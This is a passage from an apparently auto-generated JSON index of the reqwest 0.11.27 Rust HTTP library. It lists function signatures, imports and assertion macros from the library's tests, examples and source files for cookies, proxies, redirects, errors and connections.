          "assert_eq!(accepts.next().unwrap(), \"application/json\");",
          "assert_eq!(accepts.next().unwrap(), \"application/json+hal\");",
          "assert_eq!(accepts.next(), None);",
          "let url = format!(\"http://{}/4\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let url = format!(\"http://{}/4\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "let url = format!(\"http://{}/text\", server.addr());",
          "assert_eq!(resp.is_err(), false);",
          "assert_eq!(resp.is_err(), true);",
          "assert_eq!(request.body().unwrap().as_bytes(), Some(body.as_bytes()));",
          "assert_eq!(content_type, req.headers().get(CONTENT_TYPE).unwrap());",
          "assert_eq!(\"application/json\", req.headers().get(CONTENT_TYPE).unwrap());",
          "let url = format!(\"http://{}/text\", server.addr());",
          "assert_eq!(res.url().as_str(), &url);",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(res.content_length(), Some(5));",
          "assert_eq!(tls_info.is_none(), true);",
          "assert_eq!(b\"Hello\", body.as_bytes());"
        ],
        "derives": [],
        "error_handling": 34
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/brotli.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::Read;",
          "use support::server;",
          "use futures_util::stream::StreamExt;"
        ],
        "macros": [
          "assert_eq!(req.method(), \"HEAD\");",
          ".head(&format!(\"http://{}/brotli\", server.addr()))",
          "assert_eq!(body, \"\");",
          "assert_eq!(req.headers()[\"accept\"], \"application/json\");",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/accept\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          "assert_eq!(req.headers()[\"accept\"], \"*/*\");",
          "assert_eq!(req.headers()[\"accept-encoding\"], \"identity\");",
          ".get(&format!(\"http://{}/accept-encoding\", server.addr()))",
          "assert_eq!(res.status(), reqwest::StatusCode::OK);",
          ".map(|i| format!(\"test {i}\"))",
          "let mut response = format!(",
          "assert!(req.headers()[\"accept-encoding\"]",
          ".get(&format!(\"http://{}/brotli\", server.addr()))",
          "assert_eq!(body, content);"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/tests/cookie.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use support::server;"
        ],
        "macros": [
          "let url = format!(\"http://{}/\", server.addr());",
          "assert_eq!(cookies[0].name(), \"key\");",
          "assert_eq!(cookies[0].value(), \"val\");",
          "assert_eq!(cookies[1].name(), \"expires\");",
          "assert_eq!(",
          "assert_eq!(cookies[2].name(), \"path\");",
          "assert_eq!(cookies[2].path().unwrap(), \"/the-path\");",
          "assert_eq!(cookies[3].name(), \"maxage\");",
          "assert_eq!(",
          "assert_eq!(cookies[4].name(), \"domain\");",
          "assert_eq!(cookies[4].domain().unwrap(), \"mydomain\");",
          "assert_eq!(cookies[5].name(), \"secure\");",
          "assert_eq!(cookies[5].secure(), true);",
          "assert_eq!(cookies[6].name(), \"httponly\");",
          "assert_eq!(cookies[6].http_only(), true);",
          "assert_eq!(cookies[7].name(), \"samesitelax\");",
          "assert!(cookies[7].same_site_lax());",
          "assert_eq!(cookies[8].name(), \"samesitestrict\");",
          "assert!(cookies[8].same_site_strict());",
          "assert_eq!(req.headers()[\"cookie\"], \"key=val\");",
          "let url = format!(\"http://{}/\", server.addr());",
          "let url = format!(\"http://{}/2\", server.addr());",
          "assert_eq!(req.headers()[\"cookie\"], \"key=val\");",
          "assert_eq!(req.uri(), \"/3\");",
          "assert_eq!(req.headers()[\"cookie\"], \"key=val2\");",
          "let url = format!(\"http://{}/\", server.addr());",
          "let url = format!(\"http://{}/2\", server.addr());",
          "let url = format!(\"http://{}/3\", server.addr());",
          "assert_eq!(req.headers().get(\"cookie\"), None);",
          "let url = format!(\"http://{}/\", server.addr());",
          "assert_eq!(req.headers().get(\"cookie\"), None);",
          "let url = format!(\"http://{}/\", server.addr());",
          "assert_eq!(req.headers().get(\"cookie\"), None);",
          "assert_eq!(req.uri(), \"/subpath\");",
          "assert_eq!(req.headers()[\"cookie\"], \"key=val\");",
          "let url = format!(\"http://{}/\", server.addr());",
          "let url = format!(\"http://{}/subpath\", server.addr());"
        ],
        "derives": [],
        "error_handling": 29
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/json_dynamic.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          ".json(&serde_json::json!({",
          "println!(\"{echo_json:#?}\");"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/json_typed.rs",
        "function_defs": [],
        "struct_defs": [
          "struct Post {"
        ],
        "impl_blocks": [],
        "uses": [
          "use serde::{Deserialize, Serialize};"
        ],
        "macros": [
          "println!(\"{new_post:#?}\");"
        ],
        "derives": [
          "#[derive(Debug, Serialize, Deserialize)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/h3_simple.rs",
        "function_defs": [
          "fn main() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use http::Version;",
          "use reqwest::{Client, IntoUrl, Response};"
        ],
        "macros": [
          "println!(\"No CLI URL provided, using default.\");",
          "eprintln!(\"Fetching {url:?}...\");",
          "eprintln!(\"Response: {:?} {}\", res.version(), res.status());",
          "eprintln!(\"Headers: {:#?}\\n\", res.headers());",
          "println!(\"{body}\");"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/simple.rs",
        "function_defs": [
          "fn main() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "println!(\"No CLI URL provided, using default.\");",
          "eprintln!(\"Fetching {url:?}...\");",
          "eprintln!(\"Response: {:?} {}\", res.version(), res.status());",
          "eprintln!(\"Headers: {:#?}\\n\", res.headers());",
          "println!(\"{body}\");"
        ],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/blocking.rs",
        "function_defs": [
          "fn main() -> Result<(), Box<dyn std::error::Error>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "println!(\"No CLI URL provided, using default.\");",
          "eprintln!(\"Fetching {url:?}...\");",
          "eprintln!(\"Response: {:?} {}\", res.version(), res.status());",
          "eprintln!(\"Headers: {:#?}\\n\", res.headers());"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/tor_socks.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "println!(\"Status: {}\", res.status());",
          "println!(\"Is Tor: {is_tor}\");",
          "assert!(is_tor);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/examples/form.rs",
        "function_defs": [
          "fn main() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "println!(\"Response status {}\", response.status());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/response.rs",
        "function_defs": [
          "fn url(self, url: Url) -> Self;",
          "fn url(self, url: Url) -> Self {",
          "fn test_response_builder_ext() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ResponseBuilderExt for http::response::Builder {"
        ],
        "uses": [
          "use url::Url;",
          "use super::{ResponseBuilderExt, ResponseUrl};",
          "use http::response::Builder;",
          "use url::Url;"
        ],
        "macros": [
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Debug, Clone, PartialEq)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/proxy.rs",
        "function_defs": [
          "fn maybe_http_auth(&self) -> Option<&HeaderValue> {",
          "fn into_proxy_scheme(self) -> crate::Result<ProxyScheme>;",
          "fn into_proxy_scheme(self) -> crate::Result<ProxyScheme> {",
          "fn _implied_bounds() {",
          "fn prox<T: IntoProxyScheme>(_t: T) {}",
          "fn url<T: IntoUrl>(t: T) {",
          "fn into_proxy_scheme(self) -> crate::Result<ProxyScheme> {",
          "fn new(intercept: Intercept) -> Proxy {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn contains(&self, host: &str) -> bool {",
          "fn contains(&self, addr: IpAddr) -> bool {",
          "fn contains(&self, domain: &str) -> bool {",
          "fn http(host: &str) -> crate::Result<Self> {",
          "fn https(host: &str) -> crate::Result<Self> {",
          "fn socks5(addr: SocketAddr) -> crate::Result<Self> {",
          "fn socks5h(addr: SocketAddr) -> crate::Result<Self> {",
          "fn with_basic_auth<T: Into<String>, U: Into<String>>(",
          "fn set_basic_auth<T: Into<String>, U: Into<String>>(&mut self, username: T, password: U) {",
          "fn set_custom_http_auth(&mut self, header_value: HeaderValue) {",
          "fn if_no_auth(mut self, update: &Option<HeaderValue>) -> Self {",
          "fn parse(url: Url) -> crate::Result<Self> {",
          "fn scheme(&self) -> &str {",
          "fn host(&self) -> &str {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn set_basic_auth(&mut self, username: &str, password: &str) {",
          "fn set_custom_http_auth(&mut self, header_value: HeaderValue) {",
          "fn call<D: Dst>(&self, uri: &D) -> Option<ProxyScheme> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn scheme(&self) -> &str;",
          "fn host(&self) -> &str;",
          "fn port(&self) -> Option<u16>;",
          "fn scheme(&self) -> &str {",
          "fn host(&self) -> &str {",
          "fn port(&self) -> Option<u16> {",
          "fn get_sys_proxies(",
          "fn insert_proxy(proxies: &mut SystemProxyMap, scheme: impl Into<String>, addr: String) -> bool {",
          "fn get_from_environment() -> SystemProxyMap {",
          "fn insert_from_env(proxies: &mut SystemProxyMap, scheme: &str, var: &str) -> bool {",
          "fn is_cgi() -> bool {",
          "fn get_from_platform_impl() -> Result<Option<String>, Box<dyn Error>> {",
          "fn parse_setting_from_dynamic_store(",
          "fn get_from_platform_impl() -> Result<Option<String>, Box<dyn Error>> {",
          "fn get_from_platform() -> Option<String> {",
          "fn get_from_platform() -> Option<String> {",
          "fn parse_platform_values_impl(platform_values: String) -> SystemProxyMap {",
          "fn extract_type_prefix(address: &str) -> Option<&str> {",
          "fn parse_platform_values(platform_values: String) -> SystemProxyMap {",
          "fn scheme(&self) -> &str {",
          "fn host(&self) -> &str {",
          "fn port(&self) -> Option<u16> {",
          "fn url(s: &str) -> Url {",
          "fn intercepted_uri(p: &Proxy, s: &str) -> Uri {",
          "fn test_http() {",
          "fn test_https() {",
          "fn test_all() {",
          "fn test_custom() {",
          "fn test_proxy_scheme_parse() {",
          "fn test_proxy_scheme_ip_address_default_http() {",
          "fn test_proxy_scheme_parse_default_http_with_auth() {",
          "fn test_domain_matcher() {",
          "fn test_get_sys_proxies_parsing() {",
          "fn test_get_sys_proxies_registry_parsing() {",
          "fn test_get_sys_proxies_in_cgi() {",
          "fn test_sys_no_proxy() {",
          "fn test_proxy_no_proxy_interception_for_proxy_types() {",
          "fn test_wildcard_sys_no_proxy() {",
          "fn test_empty_sys_no_proxy() {",
          "fn test_no_proxy_load() {",
          "fn test_type_prefix_extraction() {",
          "fn env_guard(name: impl Into<String>) -> EnvGuard {",
          "fn drop(&mut self) {",
          "fn test_has_http_auth() {",
          "fn includes(haystack: &crate::error::Error, needle: url::ParseError) -> bool {",
          "fn check_parse_error(url: &str, needle: url::ParseError) {",
          "fn lookback_works() {",
          "fn loopback_port_works() {",
          "fn loopback_username_works() {",
          "fn loopback_username_password_works() {",
          "fn loopback_username_password_port_works() {",
          "fn domain_works() {",
          "fn domain_port_works() {",
          "fn domain_username_works() {",
          "fn domain_username_password_works() {",
          "fn domain_username_password_port_works() {",
          "fn host() {",
          "fn idna_encoding() {",
          "fn port() {",
          "fn ip_v4_address() {",
          "fn ip_v6_address() {",
          "fn invalid_domain_character() {",
          "fn loopback_works() {",
          "fn loopback_port_works() {",
          "fn loopback_username_works() {",
          "fn loopback_username_password_works() {",
          "fn loopback_username_password_port_works() {",
          "fn domain_works() {",
          "fn domain_port_works() {",
          "fn domain_username_works() {",
          "fn domain_username_password_works() {",
          "fn domain_username_password_port_works() {",
          "fn host() {",
          "fn idna_encoding() {",
          "fn port() {",
          "fn ip_v4_address() {",
          "fn ip_v6_address() {",
          "fn invalid_domain_character() {"
        ],
        "struct_defs": [
          "struct IpMatcher(Vec<Ip>);",
          "struct DomainMatcher(Vec<String>);",
          "struct Custom {",
          "struct MutexInner;",
          "struct EnvGuard {"
        ],
        "impl_blocks": [
          "impl ProxyScheme {",
          "impl IntoProxyScheme for ProxyScheme {",
          "impl Proxy {",
          "impl fmt::Debug for Proxy {",
          "impl NoProxy {",
          "impl IpMatcher {",
          "impl DomainMatcher {",
          "impl ProxyScheme {",
          "impl fmt::Debug for ProxyScheme {",
          "impl Intercept {",
          "impl Custom {",
          "impl fmt::Debug for Custom {",
          "impl Dst for Uri {",
          "impl Dst for Url {",
          "impl Drop for EnvGuard {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::net::SocketAddr;",
          "use std::sync::Arc;",
          "use crate::into_url::{IntoUrl, IntoUrlSealed};",
          "use crate::Url;",
          "use http::{header::HeaderValue, Uri};",
          "use ipnet::IpNet;",
          "use once_cell::sync::Lazy;",
          "use percent_encoding::percent_decode;",
          "use std::collections::HashMap;",
          "use std::env;",
          "use std::error::Error;",
          "use std::net::IpAddr;",
          "use system_configuration::{",
          "use winreg::enums::HKEY_CURRENT_USER;",
          "use winreg::RegKey;",
          "use url::Position;",
          "use super::*;",
          "use once_cell::sync::Lazy;",
          "use std::sync::Mutex;",
          "use crate::Proxy;",
          "use std::error::Error;",
          "use std::mem::discriminant;",
          "use crate::Proxy;",
          "use super::super::check_parse_error;",
          "use crate::Proxy;",
          "use super::super::check_parse_error;"
        ],
        "macros": [
          "let try_this = format!(\"http://{}\", self.as_str());",
          "let mut proxy = if cfg!(feature = \"__internal_proxy_sys_no_cache\") {",
          "panic!(\"Socks is not supported for this method\")",
          "ProxyScheme::Socks5 { .. } => panic!(\"socks5\"),",
          "ProxyScheme::Http { auth: _auth, host } => write!(f, \"http://{host}\"),",
          "ProxyScheme::Https { auth: _auth, host } => write!(f, \"https://{host}\"),",
          "write!(f, \"socks5{h}://{addr}\")",
          "Intercept::System(_) => unimplemented!(),",
          "Intercept::System(_) => unimplemented!(),",
          "let url = format!(",
          "if log::log_enabled!(log::Level::Warn) && env::var_os(\"HTTP_PROXY\").is_some() {",
          "log::warn!(\"HTTP_PROXY environment variable ignored in CGI\");",
          "Some(format!(\"{scheme}={proxy_host}:{proxy_port}\"))",
          "(Some(proxy_host), None) => Some(format!(\"{scheme}={proxy_host}\")),",
          "Some((http_config, https_config)) => Ok(Some(format!(\"{http_config};{https_confi",
          "format!(\"http://{address}\")",
          "insert_proxy(&mut proxies, \"http\", format!(\"http://{platform_values}\"));",
          "insert_proxy(&mut proxies, \"https\", format!(\"http://{platform_values}\"));",
          "_ => panic!(\"intercepted as socks\"),",
          "assert_eq!(intercepted_uri(&p, http), target);",
          "assert!(p.intercept(&url(other)).is_none());",
          "assert!(p.intercept(&url(http)).is_none());",
          "assert_eq!(intercepted_uri(&p, other), target);",
          "assert_eq!(intercepted_uri(&p, http), target);",
          "assert_eq!(intercepted_uri(&p, https), target);",
          "assert_eq!(intercepted_uri(&p, other), target);",
          "assert_eq!(intercepted_uri(&p, http), target2);",
          "assert_eq!(intercepted_uri(&p, https), target1);",
          "assert!(p.intercept(&url(other)).is_none());",
          "assert_eq!(auth.unwrap(), encode_basic_auth(\"foo\", \"bar\"));",
          "assert_eq!(host, \"localhost:1239\");",
          "other => panic!(\"unexpected: {other:?}\"),",
          "assert!(auth.is_none());",
          "assert_eq!(host, \"192.168.1.1:8888\");",
          "other => panic!(\"unexpected: {other:?}\"),",
          "assert_eq!(auth.unwrap(), encode_basic_auth(\"foo\", \"bar\"));",
          "assert_eq!(host, \"localhost:1239\");",
          "other => panic!(\"unexpected: {other:?}\"),",
          "assert!(matcher.contains(\"foo.bar\"));",
          "assert!(matcher.contains(\"www.foo.bar\"));",
          "assert!(matcher.contains(\"bar.foo\"));",
          "assert!(matcher.contains(\"www.bar.foo\"));",
          "assert!(!matcher.contains(\"notfoo.bar\"));",
          "assert!(!matcher.contains(\"notbar.foo\"));",
          "assert!(!baseline_proxies.contains_key(\"http\"));",
          "assert!(!invalid_proxies.contains_key(\"http\"));",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1\");",
          "assert_eq!(all_proxies.len(), 2);",
          "assert!(all_proxies.values().all(|p| p.host() == \"127.0.0.2\"));",
          "assert_eq!(baseline_proxies.contains_key(\"http\"), false);",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1\");",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1\");",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1\");",
          "assert_eq!(p.scheme(), \"https\");",
          "assert_eq!(p.host(), \"127.0.0.1\");",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1:8888\");",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.2:8888\");",
          "assert_eq!(p.scheme(), \"http\");",
          "assert_eq!(p.host(), \"127.0.0.1:8888\");",
          "assert_eq!(p.scheme(), \"https\");",
          "assert_eq!(p.host(), \"127.0.0.2:8888\");",
          "assert_eq!(baseline_proxies[\"http\"].host(), \"evil\");",
          "assert!(!cgi_proxies.contains_key(\"http\"));",
          "assert_eq!(intercepted_uri(&p, \"http://hyper.rs\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://notfoo.bar\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://notbar.baz\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://10.43.1.1\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://10.124.7.7\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://[ffff:db8:a0b:12f0::1]\"), target);",
          "assert_eq!(intercepted_uri(&p, \"http://[2005:db8:a0b:12f0::1]\"), target);",
          "assert!(p.intercept(&url(\"http://hello.foo.bar\")).is_none());",
          "assert!(p.intercept(&url(\"http://bar.baz\")).is_none());",
          "assert!(p.intercept(&url(\"http://BAR.baz\")).is_none());",
          "assert!(p.intercept(&url(\"http://foo.bar.baz\")).is_none());",
          "assert!(p.intercept(&url(\"http://foo.bar\")).is_none());",
          "assert!(p.intercept(&url(\"http://10.42.1.100\")).is_none());",
          "assert!(p.intercept(&url(\"http://[::1]\")).is_none());",
          "assert!(p.intercept(&url(\"http://[2001:db8:a0b:12f0::1]\")).is_none());",
          "assert!(p.intercept(&url(\"http://10.124.7.8\")).is_none());",
          "assert_eq!(intercepted_uri(&p, \"http://hyper.rs\"), proxy_url);",
          "assert!(p.intercept(&url(\"https://hello.no.proxy.tld\")).is_none());",
          "assert_eq!(intercepted_uri(&p, \"http://hyper.rs\"), proxy_url);",
          "assert!(p.intercept(&url(\"http://hello.no.proxy.tld\")).is_none());",
          "assert!(p.intercept(&url(\"https://hyper.rs\")).is_none());",
          "assert_eq!(intercepted_uri(&p, \"https://hyper.rs\"), proxy_url);",
          "assert!(p.intercept(&url(\"https://hello.no.proxy.tld\")).is_none());",
          "assert!(p.intercept(&url(\"http://hyper.rs\")).is_none());",
          "assert_eq!(intercepted_uri(&p, \"https://hyper.rs\"), proxy_url);",
          "assert!(p.intercept(&url(\"https://hello.no.proxy.tld\")).is_none());",
          "assert!(p.intercept(&url(\"http://hello.no.proxy.tld\")).is_none());",
          "assert!(p.intercept(&url(\"http://foo.bar\")).is_none());",
          "assert_eq!(intercepted_uri(&p, \"http://hyper.rs\"), target);",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(p.no_proxy.is_none(), \"NoProxy shouldn't have been created\");",
          "assert_eq!(intercepted_uri(&p, \"http://hyper.rs\"), target);",
          "assert!(extract_type_prefix(\"test\").is_none());",
          "assert!(extract_type_prefix(\"://test\").is_none());",
          "assert!(extract_type_prefix(\"some:prefix://test\").is_none());",
          "assert!(extract_type_prefix(\"some/prefix://test\").is_none());",
          "assert_eq!(extract_type_prefix(\"http://test\").unwrap(), \"http\");",
          "assert_eq!(extract_type_prefix(\"a://test\").unwrap(), \"a\");",
          "assert!(http_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(!http_proxy_without_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(https_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(all_http_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(all_https_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(!all_https_proxy_without_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(system_http_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "assert!(!system_https_proxy_with_auth.maybe_has_http_auth());",
          "assert_eq!(",
          "panic!(\"{needle:?} expected; {error:?}, {error} found\");"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Clone, Debug, Default)]",
          "#[derive(Clone, Debug, Default)]",
          "#[derive(Clone, Debug, Default)]",
          "#[derive(Clone)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 107
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/redirect.rs",
        "function_defs": [
          "fn default() -> Policy {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn test_redirect_policy_limit() {",
          "fn test_redirect_policy_limit_to_0() {",
          "fn test_redirect_policy_custom() {",
          "fn test_remove_sensitive_headers() {"
        ],
        "struct_defs": [
          "struct TooManyRedirects;"
        ],
        "impl_blocks": [
          "impl Policy {",
          "impl Default for Policy {",
          "impl fmt::Debug for Policy {",
          "impl fmt::Debug for PolicyKind {",
          "impl fmt::Display for TooManyRedirects {",
          "impl StdError for TooManyRedirects {}"
        ],
        "uses": [
          "use std::error::Error as StdError;",
          "use std::fmt;",
          "use crate::header::{HeaderMap, AUTHORIZATION, COOKIE, PROXY_AUTHORIZATION, WWW_AUTHENTICATE};",
          "use hyper::StatusCode;",
          "use crate::Url;",
          "use hyper::header::{HeaderValue, ACCEPT, AUTHORIZATION, COOKIE};"
        ],
        "macros": [
          "///     eprintln!(\"{}, Location: {:?}\", attempt.status(), attempt.url());",
          "matches!(self.inner, PolicyKind::Limit(10))",
          ".map(|i| Url::parse(&format!(\"http://a.b/c/{i}\")).unwrap())",
          "other => panic!(\"unexpected {other:?}\"),",
          "other => panic!(\"unexpected {other:?}\"),",
          "other => panic!(\"unexpected {other:?}\"),",
          "other => panic!(\"unexpected {other:?}\"),",
          "other => panic!(\"unexpected {other:?}\"),",
          "assert_eq!(headers, filtered_headers);",
          "assert_eq!(headers, filtered_headers);"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 24
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/util.rs",
        "function_defs": [
          "fn seed() -> u64 {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::header::{Entry, HeaderMap, HeaderValue, OccupiedEntry};",
          "use base64::prelude::BASE64_STANDARD;",
          "use base64::write::EncoderWriter;",
          "use std::io::Write;",
          "use std::cell::Cell;",
          "use std::collections::hash_map::RandomState;",
          "use std::hash::{BuildHasher, Hasher};",
          "use std::num::Wrapping;"
        ],
        "macros": [
          "let _ = write!(encoder, \"{username}:\");",
          "let _ = write!(encoder, \"{password}\");",
          "debug_assert_ne!(n.0, 0);",
          "None => unreachable!(\"HeaderMap::into_iter yielded None first\"),"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/error.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn source(&self) -> Option<&(dyn StdError + 'static)> {",
          "fn from(err: Error) -> wasm_bindgen::JsValue {",
          "fn from(err: Error) -> js_sys::Error {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn assert_send<T: Send>() {}",
          "fn assert_sync<T: Sync>() {}",
          "fn test_source_chain() {",
          "fn mem_size_of() {",
          "fn roundtrip_io_error() {",
          "fn from_unknown_io_error() {",
          "fn is_timeout() {"
        ],
        "struct_defs": [
          "struct Inner {"
        ],
        "impl_blocks": [
          "impl Error {",
          "impl fmt::Debug for Error {",
          "impl fmt::Display for Error {",
          "impl StdError for Error {",
          "impl From<crate::error::Error> for wasm_bindgen::JsValue {",
          "impl From<crate::error::Error> for js_sys::Error {",
          "impl fmt::Display for TimedOut {",
          "impl StdError for TimedOut {}",
          "impl fmt::Display for BadScheme {",
          "impl StdError for BadScheme {}"
        ],
        "uses": [
          "use std::error::Error as StdError;",
          "use std::fmt;",
          "use std::io;",
          "use crate::{StatusCode, Url};",
          "use super::*;",
          "use std::mem::size_of;"
        ],
        "macros": [
          "///             println!(\"redirect loop at {final_stop}\");",
          "matches!(self.inner.kind, Kind::Builder)",
          "matches!(self.inner.kind, Kind::Redirect)",
          "matches!(self.inner.kind, Kind::Status(_))",
          "matches!(self.inner.kind, Kind::Request)",
          "matches!(self.inner.kind, Kind::Body)",
          "matches!(self.inner.kind, Kind::Decode)",
          "debug_assert!(code.is_server_error());",
          "write!(f, \"{prefix} ({code})\")?;",
          "write!(f, \" for url ({url})\")?;",
          "write!(f, \": {e}\")?;",
          "js_sys::Error::new(&format!(\"{err}\"))",
          "format!(\"{js_val:?}\").into()",
          "assert!(root.source().is_none());",
          "assert!(link.source().is_some());",
          "assert_eq!(size_of::<Error>(), size_of::<usize>());",
          "_ => panic!(\"{err:?}\"),",
          "_ => panic!(\"{err:?}\"),",
          "assert!(err.is_timeout());",
          "assert!(nested.is_timeout());"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/lib.rs",
        "function_defs": [
          "fn _assert_impls() {",
          "fn assert_send<T: Send>() {}",
          "fn assert_sync<T: Sync>() {}",
          "fn assert_clone<T: Clone>() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! println!(\"body = {body:?}\");",
          "compile_error!(",
          "doctest!(\"../README.md\");"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/connect.rs",
        "function_defs": [
          "fn into_uri(scheme: Scheme, host: Authority) -> Uri {",
          "fn poll_ready(&mut self, _cx: &mut Context<'_>) -> Poll<Result<(), Self::Error>> {",
          "fn call(&mut self, dst: Uri) -> Self::Future {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo>;",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn tls_info(&self) -> Option<crate::tls::TlsInfo> {",
          "fn connected(&self) -> Connected {",
          "fn poll_read(",
          "fn poll_write(",
          "fn poll_write_vectored(",
          "fn is_write_vectored(&self) -> bool {",
          "fn poll_flush(self: Pin<&mut Self>, cx: &mut Context) -> Poll<Result<(), io::Error>> {",
